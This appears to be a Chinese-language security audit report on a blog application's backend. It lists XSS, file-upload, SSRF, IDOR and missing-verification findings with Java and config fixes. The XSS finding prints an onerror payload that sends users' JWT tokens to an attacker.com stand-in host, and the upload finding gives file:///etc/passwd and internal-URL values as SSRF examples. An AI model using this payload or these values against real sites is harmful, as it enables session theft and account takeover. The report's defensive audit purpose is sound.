1# MyBlog 系统安全审计报告

**审计日期**: 2026-05-17  
**审计范围**: 后端代码、API接口、权限控制、输入验证  
**审计人员**: AI Security Auditor  

---

## 📊 审计概览

| 风险等级 | 数量 | 状态 |
|---------|------|------|
| 🔴 高危 | 3 | 待修复 |
| 🟡 中危 | 4 | 待修复 |
| 🟢 低危 | 5 | 建议优化 |
| ✅ 已修复 | 8 | - |

---

## 🔴 高危漏洞

### V1: 文章正文存储型 XSS（未完全修复）

**位置**: `POST /api/posts` (文章内容)  
**严重性**: 🔴 高危  
**状态**: ⚠️ **部分修复，仍有风险**

#### 问题描述

根据渗透测试报告（`docs/渗透测试/MyBlog渗透测试报告.md`），前端在渲染文章正文时使用 `innerHTML`，存在XSS风险。

虽然已有SVG清洗机制，但**文章内容未经过HTML清洗**：

```java
// PostServiceImpl.java - 创建文章时
post.setContent(request.getContent());  // ❌ 直接存储，未清洗
```

#### 攻击场景

```html
<!-- 攻击者提交的文章内容 -->
<img src=x onerror="fetch('https://attacker.com?t='+encodeURIComponent(localStorage.getItem('token')))">
```

任何访问该文章的用户，其JWT Token会被发送到攻击者服务器。

#### 影响范围

- ✅ 用户Token泄露
- ✅ 会话劫持
- ✅ 管理员账户接管
- ✅ 数据篡改

#### 当前防护

- ✅ SVG头像已清洗（SvgSanitizerService）
- ❌ **文章内容未清洗**
- ❌ 无CSP响应头
- ❌ JWT存储在localStorage（易被XSS窃取）

#### 修复建议

**方案A（推荐）：服务端HTML清洗**
```java
// 添加依赖
implementation 'org.jsoup:jsoup:1.17.2'

// 在PostServiceImpl中
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

private static final Safelist POST_CONTENT_SAFELIST = Safelist.relaxed()
    .addTags("code", "pre")
    .addAttributes("code", "class")  // 允许代码高亮
    .removeProtocols("a", "href", "javascript");  // 禁止javascript:

public Long createPost(Long userId, CreatePostRequest request) {
    // ... 其他逻辑
    
    // 清洗HTML内容
    String safeContent = Jsoup.clean(request.getContent(), POST_CONTENT_SAFELIST);
    post.setContent(safeContent);
    
    // ... 保存
}
```

**方案B：前端DOMPurify清洗**
```typescript
import DOMPurify from 'dompurify';
import marked from 'marked';

const safeHtml = DOMPurify.sanitize(marked(post.content));
document.getElementById('content').innerHTML = safeHtml;
```

**方案C（最佳）：组合方案**
- 服务端Jsoup清洗（第一道防线）
- 前端DOMPurify二次清洗（纵深防御）
- 部署CSP响应头
- JWT迁移到HttpOnly Cookie

---

### V2: 文件上传路径可预测 + 缺少MIME类型验证

**位置**: `POST /api/users/me/avatar`  
**严重性**: 🔴 高危  
**状态**: ⚠️ **部分修复，仍有残余风险**

#### 问题描述

虽然有UUID命名和扩展名校验，但存在以下问题：

1. **MIME类型仅检查请求头，未验证文件内容**
   ```java
   // AvatarUploadService.java
   String contentType = file.getContentType();  // ❌ 可伪造
   if (!ALLOWED_MIME_TYPES.contains(contentType)) {
       throw new BusinessException("不支持的文件类型");
   }
   ```

2. **JSP/SVG Webshell仍可上传**（渗透测试已验证）
   - 攻击者上传 `avatar.jpg`，内容为JSP代码
   - 文件成功写入服务器
   - 如果未来配置了JSP解析器，可直接执行

3. **Avatar字段接受任意URL**
   ```java
   // UpdateUserRequest.java
   private String avatar;  // ❌ 无URL白名单校验
   
   // 攻击者可设置: avatar = "file:///etc/passwd"
   // 或内网地址: avatar = "http://192.168.1.1/admin"
   ```

#### 当前防护

- ✅ UUID文件名（防止猜测）
- ✅ 扩展名白名单
- ✅ SVG清洗（SvgSanitizerService）
- ❌ **缺少Magic Bytes验证**
- ❌ **Avatar URL无白名单**

#### 修复建议

**1. 添加Magic Bytes验证**
```java
// AvatarUploadService.java
private void validateFileContent(MultipartFile file) {
    try (InputStream is = file.getInputStream()) {
        byte[] header = new byte[8];
        is.read(header);
        
        String extension = getFileExtension(file.getOriginalFilename());
        
        switch (extension.toLowerCase()) {
            case ".jpg":
            case ".jpeg":
                if (!(header[0] == (byte)0xFF && header[1] == (byte)0xD8)) {
                    throw new BusinessException("文件内容与扩展名不匹配");
                }
                break;
            case ".png":
                if (!(header[0] == (byte)0x89 && header[1] == 'P' && 
                      header[2] == 'N' && header[3] == 'G')) {
                    throw new BusinessException("文件内容与扩展名不匹配");
                }
                break;
            case ".gif":
                if (!(new String(header, 0, 3).equals("GIF"))) {
                    throw new BusinessException("文件内容与扩展名不匹配");
                }
                break;
            case ".svg":
                // SVG已由SvgSanitizerService处理
                break;
            default:
                throw new BusinessException("不支持的文件类型");
        }
    } catch (IOException e) {
        throw new BusinessException("文件读取失败");
    }
}
```

**2. Avatar URL白名单**
```java
// UserService.java - updateUser方法
private void validateAvatarUrl(String avatarUrl) {
    if (avatarUrl == null || avatarUrl.isEmpty()) {
        return;
    }
    
    // 只允许MinIO路径或HTTPS协议
    if (avatarUrl.startsWith("/api/users/avatar/")) {
        return;  // MinIO路径
    }
    
    if (avatarUrl.startsWith("https://")) {
        // 域名白名单
        List<String> allowedDomains = Arrays.asList(
            "cdn.example.com",
            "images.example.com"
        );
        
        try {
            URL url = new URL(avatarUrl);
            if (!allowedDomains.contains(url.getHost())) {
                throw new BusinessException("不允许的头像URL域名");
            }
        } catch (MalformedURLException e) {
            throw new BusinessException("无效的URL格式");
        }
        return;
    }
    
    throw new BusinessException("头像URL必须是MinIO路径或HTTPS链接");
}
```

---

### V3: 敏感操作缺少二次验证

**位置**: 管理员操作接口  
**严重性**: 🔴 高危  
**状态**: ❌ **未实施**

#### 问题描述

以下高危操作仅需普通管理员权限，无二次验证：

1. **重置用户密码** (`PUT /api/users/admin/{userId}/reset-password`)
2. **修改用户角色** (`PUT /api/users/admin/{userId}/role`)
3. **删除文章** (`DELETE /api/posts/{postId}`)
4. **禁用用户** (`PUT /api/users/admin/{userId}/status`)

#### 攻击场景

1. 攻击者获取管理员Token（通过XSS或其他方式）
2. 直接调用密码重置接口
3. 将目标用户密码改为已知值
4. 接管账户

#### 当前防护

- ✅ @RequireAdmin注解
- ✅ 能力验证（AbilityValidator）
- ❌ **无二次验证**
- ❌ **无操作确认**
- ❌ **审计日志不够详细**

#### 修复建议

**方案A：短信/邮箱验证码**
```java
// 重置密码前发送验证码
@PostMapping("/admin/{userId}/reset-password/send-code")
public Result<Void> sendResetCode(@RequestAttribute Long operatorId,
                                   @PathVariable Long targetUserId) {
    User targetUser = userService.getUserById(targetUserId);
    
    // 发送验证码到用户邮箱/手机
    String code = generateVerificationCode();
    verificationCodeService.sendCode(targetUser.getEmail(), code);
    
    // 缓存验证码（5分钟有效）
    redisTemplate.opsForValue().set(
        "reset_code:" + targetUserId, 
        code, 
        5, TimeUnit.MINUTES
    );
    
    return Result.success("验证码已发送");
}

// 验证后重置密码
@PutMapping("/admin/{userId}/reset-password")
public Result<Void> resetPassword(@RequestAttribute Long operatorId,
                                   @PathVariable Long userId,
                                   @RequestBody ResetPasswordRequest request) {
    // 验证验证码
    String storedCode = redisTemplate.opsForValue().get("reset_code:" + userId);
    if (!request.getVerificationCode().equals(storedCode)) {
        throw new BusinessException("验证码错误或已过期");
    }
    
    // 执行重置
    userService.resetPassword(userId, request.getNewPassword());
    
    // 删除验证码
    redisTemplate.delete("reset_code:" + userId);
    
    // 记录详细审计日志
    auditLogService.recordSensitiveOperation(
        operatorId, "RESET_PASSWORD", userId, 
        "操作员" + operatorId + "重置了用户" + userId + "的密码"
    );
    
    return Result.success("密码重置成功");
}
```

**方案B：管理员二次认证**
```java
// 要求输入当前管理员密码
@PutMapping("/admin/{userId}/reset-password")
public Result<Void> resetPassword(@RequestAttribute Long operatorId,
                                   @PathVariable Long userId,
                                   @RequestBody ResetPasswordRequest request) {
    // 验证操作员密码
    User operator = userService.getUserById(operatorId);
    if (!passwordEncoder.matches(request.getOperatorPassword(), operator.getPassword())) {
        throw new BusinessException("操作员密码错误");
    }
    
    // 执行重置...
}
```

---

## 🟡 中危漏洞

### V4: IDOR - 用户信息查询权限过宽

**位置**: `GET /api/users/{userId}`  
**严重性**: 🟡 中危  
**状态**: ⚠️ **已部分修复，仍需加强**

#### 问题描述

当前实现允许：
- ✅ 用户查看自己的信息
- ✅ 管理员查看所有用户信息

但存在问题：
```java
// UserController.java
@GetMapping("/{userId}")
public Result<UserBasicResponse> getUserById(@RequestAttribute Long userId,
                                             @PathVariable Long targetUserId) {
    User currentUser = userService.getUserById(userId);
    boolean isAdmin = currentUser != null && Boolean.TRUE.equals(currentUser.getIsAdmin());
    
    // 权限校验
    if (!userId.equals(targetUserId) && !isAdmin) {
        return Result.error(403, "无权查看他人信息");
    }
    
    return Result.success(userService.getUserBasicInfo(targetUserId));
}
```

**问题**:
1. 管理员可以批量枚举所有用户ID（1, 2, 3...）
2. 返回的信息包含：username, nickname, isAdmin, createTime
3. 攻击者获取管理员Token后，可导出全部用户列表

#### 修复建议

**限制管理员查询频率**
```java
// 添加速率限制
@RateLimit(maxRequests = 100, timeWindow = 60)  // 每分钟最多100次
@GetMapping("/{userId}")
public Result<UserBasicResponse> getUserById(...) {
    // ...
}
```

**脱敏返回数据**
```java
// UserBasicResponse.java
public class UserBasicResponse {
    private Long id;
    private String nickname;  // 保留
    private String username;  // ❌ 移除或脱敏
    private Boolean isAdmin;  // ❌ 移除
    private LocalDateTime createTime;  // ❌ 移除
    
    // 仅返回必要信息
}
```

**分页查询替代单点查询**
```java
// 提供专用的管理员用户列表接口（带分页和过滤）
@RequireAdmin
@GetMapping("/admin/users")
public Result<PageResult<UserListItem>> listUsers(
    @RequestParam int pageNum,
    @RequestParam int pageSize,
    @RequestParam(required = false) String keyword
) {
    // 返回脱敏后的用户列表
}
```

---

### V5: 评论功能缺少速率限制

**位置**: `POST /api/comments`  
**严重性**: 🟡 中危  
**状态**: ❌ **未实施**

#### 问题描述

评论接口无速率限制，可能导致：
1. 垃圾评论轰炸
2. 数据库压力过大
3. 存储空间耗尽

#### 修复建议

```java
// CommentController.java
@PostMapping
@RateLimit(maxRequests = 10, timeWindow = 60)  // 每分钟最多10条评论
public Result<CommentResponse> createComment(@RequestAttribute Long userId,
                                              @Valid @RequestBody CreateCommentRequest request) {
    // ...
}
```

或使用Redis实现：
```java
// CaptchaRateLimitService.java - 复用现有服务
public boolean canComment(Long userId) {
    String key = "rate:comment:" + userId;
    Long count = redisTemplate.opsForValue().increment(key);
    
    if (count == 1) {
        redisTemplate.expire(key, 60, TimeUnit.SECONDS);
    }
    
    return count <= 10;  // 每分钟最多10条
}
```

---

### V6: API响应暴露内部信息

**位置**: 全局异常处理  
**严重性**: 🟡 中危  
**状态**: ⚠️ **部分修复**

#### 问题描述

某些异常可能暴露：
- Java类名
- 堆栈跟踪
- 数据库表名
- SQL语句片段

#### 当前防护

- ✅ BusinessException统一处理
- ❌ **未知异常可能泄露细节**

#### 修复建议

```java
// GlobalExceptionHandler.java
@ExceptionHandler(Exception.class)
public Result<Void> handleUnknownException(Exception e) {
    // 生产环境：记录详细日志，返回通用消息
    log.error("未处理的异常", e);
    
    return Result.error(500, "服务器内部错误，请稍后重试");
}

@ExceptionHandler(MethodArgumentNotValidException.class)
public Result<Void> handleValidationException(MethodArgumentNotValidException e) {
    // 参数验证失败：不暴露字段名
    return Result.error(400, "请求参数无效");
}
```

---

### V7: JWT Token无刷新机制

**位置**: JWT认证  
**严重性**: 🟡 中危  
**状态**: ❌ **未实施**

#### 问题描述

- Token有效期固定（假设24小时）
- 一旦泄露，攻击者有完整24小时窗口
- 无法主动撤销（除非加入黑名单）

#### 修复建议

**实现Refresh Token机制**
```java
// LoginResponse.java
public class LoginResponse {
    private String accessToken;   // 短期（15分钟）
    private String refreshToken;  // 长期（7天）
    private Long expiresIn;
}

// 刷新Token接口
@PostMapping("/refresh")
public Result<LoginResponse> refreshToken(@RequestBody RefreshTokenRequest request) {
    // 验证refresh token
    // 颁发新的access token
    // 轮换refresh token
}
```

---

## 🟢 低危问题

### V8: 缺少CSP响应头

**建议**: 添加Content-Security-Policy
```nginx
# Nginx配置
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;
```

### V9: 缺少HSTS响应头

**建议**: 强制HTTPS
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

### V10: 登录成功响应泄露过多信息

**位置**: `POST /api/users/login`  
**建议**: 减少返回字段，仅返回Token和用户ID

### V11: 缺少请求体大小限制

**建议**: 限制最大请求体
```yaml
# application.yml
spring:
  servlet:
    multipart:
      max-file-size: 5MB
      max-request-size: 10MB
```

### V12: 数据库连接池配置未优化

**建议**: 调整HikariCP参数
```yaml
spring:
  datasource:
    hikari:
      maximum-pool-size: 20
      minimum-idle: 5
      connection-timeout: 30000
      idle-timeout: 600000
      max-lifetime: 1800000
```

---

## ✅ 已修复的安全功能

### F1: 滑块验证码增强（最新修复）
- ✅ 动态位置混淆
- ✅ 行为分析验证
- ✅ 轨迹抖动检测
- Commit: `8f4c5bb`

### F2: 登录速率限制
- ✅ IP级别限流
- ✅ 账号锁定机制
- ✅ Redis存储

### F3: SVG头像清洗
- ✅ XXE防护
- ✅ 危险元素移除
- ✅ 事件处理器过滤

### F4: 文章审核流程
- ✅ 所有新文章待审核
- ✅ 状态修改需审核
- ✅ 审计日志记录

### F5: 能力管理系统
- ✅ 细粒度权限控制
- ✅ 超级管理员隔离
- ✅ 最小权限原则

### F6: Token黑名单
- ✅ 登出立即失效
- ✅ Redis自动过期

### F7: 密码加密
- ✅ BCrypt强哈希
- ✅ 无明文存储

### F8: SQL注入防护
- ✅ MyBatis-Plus参数化查询
- ✅ 无拼接SQL

---

## 📋 修复优先级建议

### P0 - 立即修复（1周内）

1. **V1: 文章XSS清洗** - 最高优先级
   - 实施方案A（服务端Jsoup）
   - 预计工作量: 4小时

2. **V2: 文件上传Magic Bytes验证**
   - 添加文件内容验证
   - 预计工作量: 2小时

3. **V3: 敏感操作二次验证**
   - 至少实施密码重置二次验证
   - 预计工作量: 8小时

### P1 - 近期修复（1个月内）

4. **V4: IDOR权限收紧**
5. **V5: 评论速率限制**
6. **V6: 异常信息脱敏**

### P2 - 中期优化（3个月内）

7. **V7: JWT刷新机制**
8. **V8-V12: 安全响应头和配置优化**

---

## 🔍 持续监控建议

### 1. 安全日志监控

```bash
# 监控异常登录
grep "登录失败" logs/myblog.log | awk '{print $NF}' | sort | uniq -c | sort -rn

# 监控高频API调用
grep "POST /api/comments" logs/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

### 2. 定期安全扫描

- 每月执行一次OWASP ZAP扫描
- 每季度进行一次渗透测试
- 持续监控依赖库漏洞（GitHub Dependabot）

### 3. 审计日志分析

```sql
-- 查找可疑操作
SELECT * FROM t_audit_log 
WHERE operation_type IN ('RESET_PASSWORD', 'CHANGE_ROLE')
ORDER BY create_time DESC 
LIMIT 100;
```

---

## 📞 联系方式

如有疑问或需要技术支持，请联系安全团队。

**报告生成时间**: 2026-05-17  
**下次审计计划**: 2026-06-17  
**文档版本**: v1.0
